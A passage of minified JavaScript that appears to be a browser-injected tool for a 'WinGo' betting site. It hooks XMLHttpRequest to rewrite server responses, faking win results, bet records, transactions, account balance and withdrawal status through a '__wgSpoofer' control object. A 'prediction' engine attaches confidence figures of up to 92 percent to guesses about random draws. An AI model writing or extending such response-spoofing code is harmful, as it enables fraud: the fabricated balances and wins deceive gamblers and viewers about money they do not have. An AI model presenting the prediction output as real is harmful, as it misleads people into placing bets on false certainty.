            l = e[0] && e[0].issueNumber != null ? String(e[0].issueNumber) : "";
        for (var f = 0; f < e.length; f++) {
            var c = String(e[f].issueNumber || ""),
                p = sn(c, o),
                w = gn(c, o);
            if (!w && o) {
                var S = !p.length ? Bn(o, c) : In(o, c);
                ((w = An(o, c, S)), (i = !0));
            }
            if (!w) continue;
            ((e[f].number = String(w.num)),
                (e[f].color = w.color),
                (e[f].premium = String(w.num)));
            for (var M = 0; M < p.length; M++) if (Hn(p[M].rig)) i = !0;
        }
        if (i) j();
        try {
            window.dispatchEvent(
                new CustomEvent("kismat:gameData", {
                    detail: {
                        type: "history",
                        game: o || "",
                        latestIssue: l,
                        nextIssue: Gt(l),
                        list: e,
                        ts: Date.now(),
                    },
                }),
            );
        } catch (q) { }
    },
    GetWinLossResult: function (n, t) {
        if (!n.data) return;
        var e = String(fn(t ? t._kUrl : "", "issueNumber") || "");
        if (!e) return;
        var o = fn(t ? t._kUrl : "", "gameCode");
        if (!o && t && t._kUrl) {
            var i = t._kUrl.match(/\/WinGo\/([^\/?]+)(?:\/|\.json|\?|$)/);
            if (i) o = decodeURIComponent(i[1]);
        }
        var l = o || to(e);
        if (!l) return;
        var f = sn(e, l);
        if (!f.length) return;
        var c = 0,
            p = !1,
            w = !1;
        for (var S = 0; S < f.length; S++) {
            if (Hn(f[S].rig)) w = !0;
            if (((c += f[S].rig.win || 0), f[S].rig.win > 0)) p = !0;
        }
        if (((n.data.status = p), (n.data.winAmount = p ? c : 0), w)) j();
    },
    GetRecordPage: function (n, t) {
        var e = n.data,
            o = e && e.list;
        if (!o) return;
        var i = Sn(t ? t._kUrl : null),
            l = parseInt(fn(t ? t._kUrl : "", "pageNo") || e.pageNo || 1, 10),
            f = parseInt(
                fn(t ? t._kUrl : "", "pageSize") || e.pageSize || o.length || 10,
                10,
            ),
            c = {},
            p = {};
        for (var w = 0; w < o.length; w++) {
            var S = o[w],
                M = String(S.issueNumber || "");
            if (!c[M]) c[M] = sn(M, i).slice();
            var q = c[M],
                h = -1,
                $ = -1,
                L = wn(S.amount || 0, S.betMultiple || 1);
            for (var m = 0; m < q.length; m++) {
                if (String(q[m].rig.content || "") !== String(S.betContent || ""))
                    continue;
                var y = It(q[m].rig.stake, L) ? 3 : 0;
                if (Math.abs(G(S.betTime) - G(q[m].rig.time)) <= 120000) y += 1;
                if (y > $ || (y === $ && q[m].rig.time < q[h].rig.time))
                    ((h = m), ($ = y));
            }
            if (h < 0) continue;
            var a = q.splice(h, 1)[0];
            ((p[a.key] = !0), Kt(S, a.rig));
        }
        if (l !== 1 || !i) return;
        var u = o.slice();
        for (var v in E.rigs) {
            var r = E.rigs[v];
            if (r.game !== i || p[v]) continue;
            var W = eo(r),
                U = wn(W.amount, W.betMultiple),
                z = !1;
            for (var J = 0; J < u.length; J++) {
                var Q = u[J];
                if (
                    String(Q.issueNumber) !== W.issueNumber ||
                    String(Q.betContent) !== W.betContent
                )
                    continue;
                if (!It(wn(Q.amount || 0, Q.betMultiple || 1), U)) continue;
                if (Math.abs(G(Q.betTime) - G(W.betTime)) > 1500) continue;
                z = !0;
                break;
            }
            if (!z) u.push(W);
        }
        if (
            (u.sort(function (Kn, On) {
                return G(On.betTime) - G(Kn.betTime);
            }),
                u.length > f)
        )
            u = u.slice(0, f);
        if (
            ((e.list = u),
                typeof e.totalCount === "number" && e.totalCount < u.length)
        )
            e.totalCount = u.length;
        if (typeof e.totalPage === "number")
            e.totalPage = Math.max(1, Math.ceil((e.totalCount || u.length) / f));
    },
    GetTrendStatistics: function (n, t) {
        if (!n.data || !n.data.length) return;
        var e = Sn(t ? t._kUrl : null),
            o = null;
        for (var i in E.rigs) {
            var l = E.rigs[i];
            if (!l.settled || (e && l.game !== e)) continue;
            if (!o || l.time > o.time) o = l;
        }
        if (!o) return;
        var f = gn(o.issue, o.game);
        if (f) {
            for (var c = 0; c < n.data.length; c++)
                if (G(n.data[c].number) === f.num) n.data[c].missingCount = 0;
        }
    },
    GetLoadedSetting: function (n) {
        if (n && n.data)
            ((n.data.needPopupFirstRecharge = !1),
                (n.data.isOpenActivityAward = "0"),
                (n.data.isOpenJackpotReward = "0"),
                (n.data.isTaskState = "0"));
    },
    GetFirstRechargeList: function (n) {
        if (n) n.data = [];
    },
    GetSitePopMsgList: function (n) {
        if (n) n.data = [];
    },
    GetTreasureChestPopupItems: function (n) {
        if (n) n.data = [];
    },
    GetActiveSetting: function (n) {
        if (n && n.data)
            ((n.data.isOpenActivityAward = "0"),
                (n.data.isOpenJackpotReward = "0"),
                (n.data.isTaskState = "0"),
                (n.data.unJackpotCount = 0),
                (n.data.unWeeklyAwardCount = 0),
                (n.data.newbieGiftPackCount = 0));
    },
    GetPayTypeName: function (n) {
        if (n && n.data && Array.isArray(n.data.typelist))
            n.data.typelist = n.data.typelist.filter(function (t) {
                var e = (
                    (t.payName || "") +
                    " " +
                    (t.paySysName || "") +
                    " " +
                    (t.name || "")
                ).toLowerCase();
                return e.indexOf("arpay") === -1;
            });
    },
    GetRechargeTypes: function (n) {
        if (n && n.code === 0 && n.data && Array.isArray(n.data.rechargetypelist))
            ((n.data.rechargetypelist = n.data.rechargetypelist.filter(function (e) {
                var o = (
                    (e.payName || "") +
                    " " +
                    (e.paySysName || "") +
                    " " +
                    (e.code || "")
                ).toLowerCase();
                return o.indexOf("arpay") === -1;
            })),
                (window.__wgRTCache = JSON.parse(JSON.stringify(n))));
        else if (
            n &&
            n.code !== 0 &&
            window.__wgRTCache &&
            /frequent|rate.?limit/i.test(n.msg || "")
        ) {
            var t = window.__wgRTCache;
            ((n.code = t.code),
                (n.msg = t.msg),
                (n.msgCode = t.msgCode),
                (n.data = t.data));
        }
    },
    GetTransactions: function (n, t) {
        if (!n.data) return;
        var e = {};
        try {
            e = JSON.parse((t && t._kBody) || "{}");
        } catch (J) { }
        var o = parseInt(e.pageNo || 1, 10),
            i = parseInt(e.pageSize || 10, 10),
            l = e.startDate || "",
            f = e.endDate || "",
            c = e.type,
            p = c === void 0 || c === "" || String(c) === "-1",
            w = l ? new Date(l + " 00:00:00").getTime() : 0,
            S = f ? new Date(f + " 23:59:59").getTime() : 1 / 0,
            M = [];
        for (var q in E.rigs) {
            var h = E.rigs[q],
                $ = G(h.time);
            if (!$ || $ < w || $ > S) continue;
            if (!p && String(0) !== String(c)) continue;
            var L = G(h.stake);
            if (!L) L = wn(h.amount, h.betMultiple);
            M.push({
                orderNum: h.orderNo || "KG" + String(h.issue || "") + ":B",
                amount: L,
                type: 0,
                typeName: "Bet amount reduced",
                typeNameCode: "8000",
                addTime: Rn($),
                remark: "",
                _ts: $,
            });
        }
        if (!M.length) return;
        if (!n.data.list)
            n.data = {
                list: [],
                pageNo: 1,
                totalPage: 0,
                totalCount: 0,
            };
        var m = n.data.list || [],
            y = typeof n.data.totalCount === "number" ? n.data.totalCount : m.length,
            a = {};
        for (var u = 0; u < m.length; u++) a[m[u].orderNum] = !0;
        var v = [];
        for (var r = 0; r < M.length; r++) if (!a[M[r].orderNum]) v.push(M[r]);
        if (o === 1) {
            var W = v.slice(0);
            for (var U = 0; U < m.length; U++)
                ((m[U]._ts = new Date(m[U].addTime || 0).getTime() || 0), W.push(m[U]));
            W.sort(function (J, Q) {
                return (Q._ts || 0) - (J._ts || 0);
            });
            for (var z = 0; z < W.length; z++) delete W[z]._ts;
            n.data.list = W.slice(0, i);
        }
        ((n.data.totalCount = y + v.length),
            (n.data.totalPage = Math.max(1, Math.ceil(n.data.totalCount / i))),
            (n.data.pageNo = o));
    },
};
function bn(n) {
    try {
        return new Event(n);
    } catch (e) { }
    try {
        var t = document.createEvent("Event");
        return (t.initEvent(n, !1, !1), t);
    } catch (e) { }
    return null;
}
function xn(n, t, e) {
    setTimeout(function () {
        try {
            Object.defineProperty(n, "readyState", {
                value: 4,
                configurable: !0,
            });
        } catch (f) {
            try {
                n.readyState = 4;
            } catch (c) { }
        }
        try {
            Object.defineProperty(n, "status", {
                value: 200,
                configurable: !0,
            });
        } catch (f) {
            try {
                n.status = 200;
            } catch (c) { }
        }
        try {
            Object.defineProperty(n, "responseText", {
                value: t,
                configurable: !0,
            });
        } catch (f) {
            try {
                n.responseText = t;
            } catch (c) { }
        }
        try {
            Object.defineProperty(n, "response", {
                value: t,
                configurable: !0,
            });
        } catch (f) {
            try {
                n.response = t;
            } catch (c) { }
        }
        try {
            if (typeof n.onreadystatechange === "function") n.onreadystatechange();
        } catch (f) { }
        var o = bn("readystatechange");
        if (o)
            try {
                n.dispatchEvent(o);
            } catch (f) { }
        try {
            if (typeof n.onload === "function") n.onload();
        } catch (f) { }
        var i = bn("load");
        if (i)
            try {
                n.dispatchEvent(i);
            } catch (f) { }
        try {
            if (typeof n.onloadend === "function") n.onloadend();
        } catch (f) { }
        var l = bn("loadend");
        if (l)
            try {
                n.dispatchEvent(l);
            } catch (f) { }
    }, e || 10);
}
var jn = Object.keys(Gn).sort(function (n, t) {
    return t.length - n.length;
});
function oo(n) {
    var t = typeof n === "string" ? n : "";
    if (je(t)) return "WinGoState";
    for (var e = 0; e < jn.length; e++) if (t.indexOf(jn[e]) !== -1) return jn[e];
    return null;
}
var Qt = {},
    io = 1e4;
function Nt(n) {
    try {
        var t = JSON.parse(n || "{}");
        return "RT:" + (t.payid || 0);
    } catch (e) {
        return "RT:0";
    }
}
var Xt = {},
    co = 60000;
function lo(n, t) {
    try {
        var e = JSON.parse(t || "{}");
        (delete e.signature, delete e.random, delete e.timestamp);
        var o = Object.keys(e).sort(),
            i = "";
        for (var l = 0; l < o.length; l++) i += o[l] + "=" + e[o[l]] + "&";
        return n + ":" + i;
    } catch (f) {
        return n;
    }
}
var Dt = {
    GetUserInfo: 1,
    GetBalance: 1,
    GetWealthState: 1,
    GetVipUsers: 1,
    GetARGameAndPlatWallets: 1,
    GetTreasureChestPopupItems: 1,
    GetActiveSetting: 1,
    GetHomeSettings: 1,
    GetLoadedSetting: 1,
    GetDailyProfitRank: 1,
    GetPwaDomainList: 1,
    NotifyARGameRecover: 1,
    GetSiteMessageList: 1,
    GetRechargeTypes: 1,
    GetSitePopMsgList: 1,
    GetGameCategoryList: 1,
    GetAllGameList: 1,
    GetBannerList: 1,
    GetSaasAllwallets: 1,
    RecoverSaasBalance: 1,
},
    ln = {},
    fo = 2000,
    uo = Dt;
function ao(n, t) {
    try {
        var e = JSON.parse(t || "{}");
        return (
            n +
            ":" +
            (e.pageNo || 0) +
            ":" +
            (e.pageSize || 0) +
            ":" +
            (e.payid || 0) +
            ":" +
            (e.gameCode || "")
        );
    } catch (o) {
        return n;
    }
}
function Bt() {
    var n = zt();
    (setInterval(function () {
        n = zt();
    }, 5000),
        En());
    var t = XMLHttpRequest.prototype.open,
        e = XMLHttpRequest.prototype.send;
    ((XMLHttpRequest.prototype.open = function (o, i) {
        if (!n) return t.apply(this, arguments);
        return ((this._kUrl = i), (this._kEp = oo(i)), t.apply(this, arguments));
    }),
        (XMLHttpRequest.prototype.send = function (o) {
            if (!n) return e.apply(this, arguments);
            if (this._kEp === "GetRechargeTypes") {
                var i = Nt(o),
                    l = Qt[i];
                if (l && Date.now() - l.ts < io) {
                    xn(this, l.json, 10);
                    return;
                }
            }
            if (this._kEp && uo[this._kEp]) {
                var f = ao(this._kEp, o),
                    c = ln[f];
                if (c && Date.now() - c.ts < fo) {
                    ((this._kBody = o), c.xhrs.push(this));
                    return;
                }
                ((this._kDedupKey = f),
                    (ln[f] = {
                        xhrs: [],
                        ts: Date.now(),
                    }),
                    setTimeout(function () {
                        var h = ln[f];
                        if (h) {
                            for (var $ = 0; $ < h.xhrs.length; $++)
                                xn(
                                    h.xhrs[$],
                                    '{"code":-1,"data":null,"msg":"dedup timeout","msgCode":-1}',
                                    0,
                                );
                            delete ln[f];
                        }
                    }, 1e4));
            }
            if (this._kEp) {
                let h = function () {
                    if (S || p.readyState !== 4) return;
                    try {
                        var $ =
                            p.responseText ||
                            (typeof p.response === "string" ? p.response : "");
                        if (!$) return;
                        var L = JSON.parse($);
                        Gn[w](L, p);
                        var m = JSON.stringify(L);
                        if (
                            (Object.defineProperty(p, "responseText", {
                                value: m,
                                configurable: !0,
                            }),
                                Object.defineProperty(p, "response", {
                                    value: m,
                                    configurable: !0,
                                }),
                                (S = !0),
                                w === "GetRechargeTypes" && L.code === 0)
                        )
                            Qt[Nt(p._kBody)] = {
                                json: m,
                                ts: Date.now(),
                            };
                        var y = lo(w, p._kBody);
                        if (L.code === 0)
                            Xt[y] = {
                                json: m,
                                ts: Date.now(),
                            };
                        else if (
                            Dt[w] &&
                            (L.code === 313 ||
                                L.msgCode === 313 ||
                                /frequent|rate.?limit/i.test(L.msg || ""))
                        ) {
                            var a = Xt[y];
                            if (a && Date.now() - a.ts < co)
                                ((m = a.json),
                                    Object.defineProperty(p, "responseText", {
                                        value: m,
                                        configurable: !0,
                                    }),
                                    Object.defineProperty(p, "response", {
                                        value: m,
                                        configurable: !0,
                                    }));
                        }
                        if (p._kDedupKey) {
                            var u = ln[p._kDedupKey];
                            if (u) {
                                for (var v = 0; v < u.xhrs.length; v++) xn(u.xhrs[v], m, 5);
                                delete ln[p._kDedupKey];
                            }
                        }
                    } catch (r) { }
                };
                this._kBody = o;
                var p = this,
                    w = this._kEp,
                    S = !1,
                    M = p.onreadystatechange,
                    q = p.onload;
                ((p.onreadystatechange = function () {
                    if ((h(), typeof M === "function")) return M.apply(this, arguments);
                }),
                    (p.onload = function () {
                        if ((h(), typeof q === "function")) return q.apply(this, arguments);
                    }),
                    p.addEventListener("readystatechange", h),
                    p.addEventListener("load", h));
            }
            return e.apply(this, arguments);
        }),
        (window.__kismatAccuracy = A("accuracy", 70)),
        (window.__kismatRigMap = window.__kismatRigMap || {}),
        (window.__wgSpoofer = {
            getSettings: function () {
                return {
                    accuracy: A("accuracy", 70),
                    balanceOffset: A("balanceOffset", 5000),
                };
            },
            saveSetting: function (o, i) {
                var l = Zt();
                if (
                    ((l[o] = i),
                        localStorage.setItem("wg_spoof_cfg", JSON.stringify(l)),
                        o === "accuracy")
                )
                    window.__kismatAccuracy = i;
            },
            resetBalance: function () {
                ((E.balance = null), (E.balance = A("balanceOffset", 5000)), j(), dn());
            },
            getWithdrawals: function () {
                return E.withdrawals;
            },
            updateWithdrawalStatus: function (o, i) {
                if (E.withdrawals[o]) ((E.withdrawals[o].state = i), j());
            },
            predictNum: In,
            rigHash: Yt,
            colors: kn,
            isVip: function () {
                return n;
            },
        }));
}
function po(n) {
    let t = parseInt(n);
    return {
        num: t,
        big: t >= 5,
        color: t === 0 || t === 5 ? "violet" : t % 2 === 0 ? "red" : "green",
    };
}
function nt(n, t) {
    if (n.length < 2)
        return {
            len: 0,
            val: null,
        };
    let e = n[0][t],
        o = 1;
    for (let i = 1; i < n.length; i++)
        if (n[i][t] === e) o++;
        else break;
    return {
        len: o,
        val: e,
    };
}
function yo(n, t, e) {
    let o = {};
    return (
        n.slice(0, e).forEach((i) => {
            o[i[t]] = (o[i[t]] || 0) + 1;
        }),
        o
    );
}
function st(n) {
    if (n.len >= 3)
        return {
            side: !n.val,
            conf: Math.min(0.15 + n.len * 0.08, 0.45),
        };
    if (n.len >= 2)
        return {
            side: !n.val,
            conf: 0.1,
        };
    return {
        side: null,
        conf: 0,
    };
}
function Tt(n, t = 10) {
    let e = yo(n, "big", t),
        o = e[!0] || 0,
        i = e[!1] || 0,
        l = o + i;
    if (l < 5)
        return {
            side: null,
            conf: 0,
        };
    let f = o / l;
    if (f >= 0.7)
        return {
            side: !1,
            conf: 0.12,
        };
    if (f <= 0.3)
        return {
            side: !0,
            conf: 0.12,
        };
    return {
        side: null,
        conf: 0,
    };
}
function Rt(n, t = 12) {
    let e = Math.min(t, n.length);
    if (e < 4)
        return {
            side: null,
            conf: 0,
        };
    let o = 0,
        i = 0;
    for (let f = 0; f < e; f++) {
        let c = e - f;
        ((o += (n[f].big ? 1 : -1) * c), (i += c));
    }
    let l = i ? o / i : 0;
    if (Math.abs(l) < 0.08)
        return {
            side: null,
            conf: 0,
        };
    return {
        side: l > 0,
        conf: Math.min(Math.abs(l) * 0.22, 0.18),
    };
}
function bt(n, t = 24) {
    if (n.length < 6)
        return {
            side: null,
            conf: 0,
        };
    let e = n[0].big,
        o = 0,
        i = 0,
        l = Math.min(t, n.length - 1);
    for (let p = 0; p < l; p++) {
        let w = n[p + 1],
            S = n[p];
        if (w.big !== e) continue;
        if (S.big === e) o++;
        else i++;
    }
    let f = o + i;
    if (f < 3)
        return {
            side: null,
            conf: 0,
        };
    let c = o / f;
    if (c >= 0.67)
        return {
            side: e,
            conf: Math.min((c - 0.5) * 0.45, 0.18),
        };
    if (c <= 0.33)
        return {
            side: !e,
            conf: Math.min((0.5 - c) * 0.45, 0.18),
        };
    return {
        side: null,
        conf: 0,
    };
}
function xt(n, t = 6) {
    let e = n.slice(0, t);
    if (e.length < 4)
        return {
            side: null,
            conf: 0,
        };
    let o = e.reduce((i, l) => i + l.num, 0) / e.length;
    if (o >= 6.1)
        return {
            side: !0,
            conf: 0.08,
        };
    if (o <= 3.9)
        return {
            side: !1,
            conf: 0.08,
        };
    return {
        side: null,
        conf: 0,
    };
}
function jt(n) {
    if (n.length < 4)
        return {
            detected: !1,
            conf: 0,
        };
    let t = 0,
        e = Math.min(6, n.length - 1);
    for (let o = 0; o < e; o++) if (n[o].big !== n[o + 1].big) t++;
    if (t / e >= 0.8)
        return {
            detected: !0,
            nextSide: !n[0].big,
            conf: 0.15,
        };
    return {
        detected: !1,
        conf: 0,
    };
}
function vo(n) {
    let t = jt(n);
    return t.detected
        ? {
            side: t.nextSide,
            conf: t.conf,
        }
        : {
            side: null,
            conf: 0,
        };
}
function ro(n) {
    let t = nt(n, "color");
    if (t.len >= 4 && t.val !== "violet")
        return {
            color: t.val === "red" ? "green" : "red",
            conf: 0.1,
        };
    return {
        color: null,
        conf: 0,
    };
}
function At(n, t = 2, e = 28) {
    if (n.length < t + 4)
        return {
            side: null,
            conf: 0,
        };
    let o = n
        .slice(0, t)
        .map((w) => (w.big ? 1 : 0))
        .join(""),
        i = 0,
        l = 0,
        f = 0,
        c = Math.min(e, n.length - t - 1);
    for (let w = 1; w <= c; w++) {
        if (
            n
                .slice(w, w + t)
                .map((h) => (h.big ? 1 : 0))
                .join("") !== o
        )
            continue;
        let M = n[w - 1].big,
            q = c - w + 1;
        ((i += (M ? 1 : -1) * q), (l += q), f++);
    }
    if (f < 2 || !l)
        return {
            side: null,
            conf: 0,
        };
    let p = i / l;
    if (Math.abs(p) < 0.12)
        return {
            side: null,
            conf: 0,
        };
    return {
        side: p > 0,
        conf: Math.min(Math.abs(p) * 0.32, 0.24),
    };
}
function wo(n, t = 20) {
    let e = {};
    n.slice(0, t).forEach((i) => {
        e[i.num] = (e[i.num] || 0) + 1;
    });
    let o = Object.entries(e).sort((i, l) => l[1] - i[1]);
    return {
        hot: o.slice(0, 3).map((i) => parseInt(i[0])),
        cold: o.slice(-3).map((i) => parseInt(i[0])),
    };
}
function So(n) {
    let t = [],
        e = 0,
        o = Rt(n);
    if (o.conf > 0)
        ((e += o.side ? o.conf : -o.conf),
            t.push({
                name: "momentum",
                type: "trend",
                weight: o.conf,
            }));
    let i = bt(n);
    if (i.conf > 0)
        ((e += i.side ? i.conf : -i.conf),
            t.push({
                name: "transition",
                type: "flow",
                weight: i.conf,
            }));
    let l = nt(n, "big"),
        f = st(l);
    if (f.conf > 0)
        ((e += f.side ? f.conf : -f.conf),
            t.push({
                name: l.val ? "Big" : "Small",
                type: "streak",
                len: l.len,
                weight: f.conf,
            }));
    let c = Tt(n);
    if (c.conf > 0)
        ((e += c.side ? c.conf : -c.conf),
            t.push({
                name: "frequency",
                type: "bias",
                weight: c.conf,
            }));
    let p = xt(n);
    if (p.conf > 0)
        ((e += p.side ? p.conf : -p.conf),
            t.push({
                name: "pressure",
                type: "numbers",
                weight: p.conf,
            }));
    let w = jt(n);
    if (w.detected)
        ((e += w.nextSide ? w.conf : -w.conf),
            t.push({
                name: "alternating",
                type: "pattern",
                weight: w.conf,
            }));
    return {
        bigScore: e,
        signals: t,
        streak: l,
    };
}
function qo(n, t, e = 24) {
    let o = 0,
        i = 0,
        l = 0,
        f = Math.min(e, t.length - 4);
    for (let c = 1; c <= f; c++) {
        let p = n(t.slice(c));
        if (!p || p.side == null || !p.conf) continue;
        let w = t[c - 1].big,
            S = f - c + 1;
        ((o += (p.side === w ? 1 : -1) * p.conf * S), (i += p.conf * S), l++);
    }
    return {
        edge: i ? o / i : 0,
        count: l,
    };
}
var mo = [
    {
        name: "memory-2",
        type: "memory",
        run: (n) => At(n, 2, 28),
        minCount: 3,
    },
    {
        name: "memory-3",
        type: "memory",
        run: (n) => At(n, 3, 36),
        minCount: 2,
    },
    {
        name: "momentum",
        type: "trend",
        run: Rt,
        minCount: 4,
    },
    {
        name: "transition",
        type: "flow",
        run: bt,
        minCount: 4,
    },
    {
        name: "revert",
        type: "streak",
        run: (n) => st(nt(n, "big")),
        minCount: 4,
    },
    {
        name: "hot-cold",
        type: "bias",
        run: Tt,
        minCount: 4,
    },
    {
        name: "pressure",
        type: "numbers",
        run: xt,
        minCount: 4,
    },
    {
        name: "alternating",
        type: "pattern",
        run: vo,
        minCount: 3,
    },
];
function Ln(n) {
    if (!n || n.length < 3)
        return {
            prediction: "Big",
            confidence: 54,
            color: "green",
            signals: [],
            heatmap: {
                hot: [],
                cold: [],
            },
            topNumber: 7,
        };
    let t = n.map(($) => po($.number || $.num || $)),
        e = wo(t),
        o = ro(t),
        i = So(t),
        l = [],
        f = 0,
        c = 0;
    for (let $ of mo) {
        let L = $.run(t);
        if (!L || L.side == null || !L.conf) continue;
        let m = qo($.run, t, 24);
        if (m.count < $.minCount) continue;
        let y = L.side,
            a = Math.min(Math.abs(m.edge), 0.45) * (0.7 + L.conf);
        if (m.edge < -0.18) ((y = !y), (a *= 0.6));
        else if (m.edge < 0.05) continue;
        ((f += (y ? 1 : -1) * a),
            (c += a),
            l.push({
                name: $.name,
                type: $.type,
                weight: Number(a.toFixed(3)),
                edge: Number(m.edge.toFixed(3)),
                mode: y === L.side ? "direct" : "flip",
            }));
    }
    let p = c ? f : i.bigScore,
        w = p >= 0,
        S = Math.round(
            Math.min(
                Math.max(
                    c ? 0.53 + Math.abs(p) * 0.62 + Math.min(c, 0.18) : 0.5 + Math.abs(p),
                    0.54,
                ),
                0.92,
            ) * 100,
        ),
        M = o.color ?? (w ? "red" : "green"),
        q = e.hot.find(($) => (w ? $ >= 5 : $ < 5)) ?? (w ? 7 : 3),
        h = (l.length ? l : i.signals)
            .sort(($, L) => (L.weight || 0) - ($.weight || 0))
            .slice(0, 4);
    return {
        prediction: w ? "Big" : "Small",
        confidence: S,
        color: M,
        signals: h,
        heatmap: e,
        topNumber: q,
        streak: {
            side: i.streak.val ? "Big" : "Small",
            len: i.streak.len,
        },
    };
}
var go = [
    "053d2b99",
    "49176bf8",
    "62fbe730",
    "31762cc1",
    "ba9fa4ff",
    "46891538",
    "9319baa4",
    "4e868eee",
    "832f9a99",
    "9cf62e12",
],
    tt = Object.create(null),
    F = an(),
    kt = dt(F),
    hn = null,
    Qn = null;
function _t(n) {
    return "/assets/png/ball_" + n + "-" + go[n] + ".webp";
}
function s(n = F) {
    if (((n = n || "WinGo_30S"), !tt[n]))
        tt[n] = {
            history: [],
            issue: "",
            latestIssue: "",
            lastSec: -1,
        };
    return tt[n];
}
function Eo(n) {
    if (
        ((n = String(n || "")
            .toLowerCase()
            .replace(/\s+/g, "")),
            n.includes("wingo30"))
    )
        return "WinGo_30S";
    if (n.includes("wingo1min") || n.includes("wingo1m")) return "WinGo_1M";
    if (n.includes("wingo3min") || n.includes("wingo3m")) return "WinGo_3M";
    if (n.includes("wingo5min") || n.includes("wingo5m")) return "WinGo_5M";
    return "";
}
function an() {
    let n = document.querySelector(
        ".timer-card.active .card-title, .TimeLeft__C-name",
    ),
        t = Eo(n && n.textContent);
    if (t) return t;
    let e = (location.hash || "").match(/gameCode=(WinGo_\w+)/);
    return e ? e[1] : "WinGo_30S";
}
function dt(n) {
    if (!n) return 30;
    let t = n.match(/(\d+)M$/i);
    if (t) return parseInt(t[1], 10) * 60;
    let e = n.match(/(\d+)S$/i);
    if (e) return parseInt(e[1], 10);
    return 30;
}
function b(n) {
    let t = String(n == null ? "" : n).trim();
    return /^\d{8,22}$/.test(t) ? t : "";
}
function et(n) {
    if (((n = b(n)), !n)) return "";
    try {
        return (BigInt(n) + 1n).toString();
    } catch (t) {
        return "";
    }
}
function ne(n, t) {
    if (((n = b(n)), (t = b(t)), !n || !t)) return 0;
    try {
        let e = BigInt(n),
            o = BigInt(t);
        return e > o ? 1 : e < o ? -1 : 0;
    } catch (e) {
        return n > t ? 1 : n < t ? -1 : 0;
    }
}
function Mn() {
    let n = an();
    if (n && n !== F) lt(n);
}
function te(n) {
    return ((n = n || F || "WinGo_30S"), (F = n), (kt = dt(n)), s(n), n);
}
function ot() {
    return document.querySelector("prediction-panel")?.shadowRoot;
}
function $n() {
    return !!ot()?.querySelector(".view-pro.active");
}
function Nn() {
    return F;
}
function it() {
    return s().history;
}
function ee() {
    return s().issue;
}
function oe() {
    return s().latestIssue;
}
function ie(n) {
    s().lastSec = n;
}
function ct(n) {
    if (!n) return "—";
    return n
        .replace(/^WinGo_/, "")
        .replace(/(\d+)S$/i, "$1sec")
        .replace(/(\d+)M$/i, "$1m");
}
function tn(n) {
    let t = ot();
    if (!t) return;
    let e = t.querySelector("#pro-waiting"),
        o = t.querySelector("#pro-prediction"),
        i = t.querySelector("#pro-card"),
        l = t.querySelector("#scan-lbl");
    if (!e || !o || !i) return;
    if (n === "result") {
        ((e.style.display = "none"),
            (o.style.display = "block"),
            i.classList.remove("shimmer"));
        return;
    }
    if (
        ((e.style.display = "flex"),
            (o.style.display = "none"),
            (i.className = i.className.replace(/\bc-\w+\b/g, "").trim() + " shimmer"),
            l && l.childNodes[0])
    )
        l.childNodes[0].textContent = n === "analyzing" ? "Analyzing" : "Scanning";
}
function ce(n, t) {
    if (!Array.isArray(t) || !t.length) return;
    n = n || an() || F;
    let e = b(t[0].issueNumber ?? t[0].issue);
    if (!e) return;
    let o = s(n);
    ((o.history = t), (o.latestIssue = e));
    let i = et(e);
    if (i && (!o.issue || ne(o.issue, e) <= 0)) o.issue = i;
    if (n !== F || !$n()) return;
    setTimeout(() => hn?.(), 0);
}
function le(n, t, e) {
    n = n || an() || F;
    let o = s(n),
        i = b(t) || b(e) || et(t);
    if (!i) return;
    if (
        !o.issue ||
        i !== o.issue ||
        (o.latestIssue && ne(o.issue, o.latestIssue) <= 0)
    ) {
        if (((o.issue = i), n === F && $n())) setTimeout(() => hn?.(), 0);
    }
}
function en() {
    let n = F;
    if (!n) return;
    let t = new XMLHttpRequest();
    (t.open("GET", "/WinGo/" + n + "/GetHistoryIssuePage.json?ts=" + Date.now()),
        t.send());
}
function fe(n, t) {
    Mn();
    let e = n || F;
    (ce(e, t?.data?.list),
        le(
            e,
            t?.current?.issueNumber || t?.data?.current?.issueNumber,
            t?.next?.issueNumber || t?.data?.next?.issueNumber,
        ));
}
function Lo(n) {
    let t = n.detail;
    if (!t || t.type !== "history") return;
    (Mn(), ce(t.game || F, t.list));
}
function ho(n) {
    let t = n.detail;
    if (!t) return;
    (Mn(), le(t.game || F, t.currentIssue, t.nextIssue));
}
function ue() {
    if (Qn) return;
    Qn = setInterval(() => {
        if (!$n() || s().history.length) {
            (clearInterval(Qn), (Qn = null));
            return;
        }
        en();
    }, 3000);
}
function Mo() {
    let n = ot();
    if (!n?.querySelector(".view-pro.active")) return;
    Mn();
    let t = F,
        e = s(t),
        o = document.querySelector(".TimeLeft__C-time"),
        i = document.querySelector(".TimeLeft__C-id"),
        l = document.querySelector(".TimeLeft__C-name"),
        f = n.querySelector("#pro-timer"),
        c = n.querySelector("#pro-timer-wrap");
    if (!f || !c) return;
    if (o) {
        let w = o.textContent.trim();
        f.textContent = w;
        let S = w.split(":"),
            M = (parseInt(S[0], 10) || 0) * 60 + (parseInt(S[1], 10) || 0);
        if (
            (c.style.setProperty(
                "--pct",
                Math.max(0, Math.min(100, (M / kt) * 100)) + "%",
            ),
                f.classList.remove("t-warn", "t-end"),
                c.classList.remove("tw-warn", "tw-end"),
                M <= 5)
        )
            (f.classList.add("t-end"), c.classList.add("tw-end"));
        else if (M <= 10) (f.classList.add("t-warn"), c.classList.add("tw-warn"));
        if (e.lastSec >= 0 && e.lastSec <= 4 && M > e.lastSec + 5)
            setTimeout(en, 250);
        e.lastSec = M;
    }
    if (i) {
        let w = String(i.textContent).trim(),
            S = b(w);
        if (S && e.issue !== S) ((e.issue = S), setTimeout(() => hn?.(), 0));
        let M = n.querySelector("#pro-period"),
            q = b(e.issue) || S || w;
        if (M) M.textContent = "#" + q.slice(-6);
    }
    let p = n.querySelector("#pro-mode");
    if (p) p.textContent = l?.textContent.trim() || ct(t);
}
function ae({ onPred: n }) {
    (te(an()),
        (hn = n),
        window.addEventListener("kismat:gameData", Lo),
        window.addEventListener("kismat:issue", ho),
        window.addEventListener("hashchange", Mn),
        setInterval(Mo, 300),
        setInterval(() => {
            if ($n()) en();
        }, 12000));
}
function lt(n) {
    if (((n = n || an()), !n)) return;
    let t = n !== F;
    te(n);
    let e = s(n),
        i =
            b(document.querySelector(".TimeLeft__C-id")?.textContent) ||
            et(e.latestIssue),
        l = !!(e.history.length && i && e.issue === i);
    if (i) e.issue = i;
    if (((e.lastSec = -1), !t)) return;
    if ($n()) {
        if (!l) tn("loading");
        else setTimeout(() => hn?.(), 0);
        en();
    }
}
function pe(n, t) {
    return Math.max(0, Math.min(n, window.innerWidth - t));
}
function ye(n, t) {
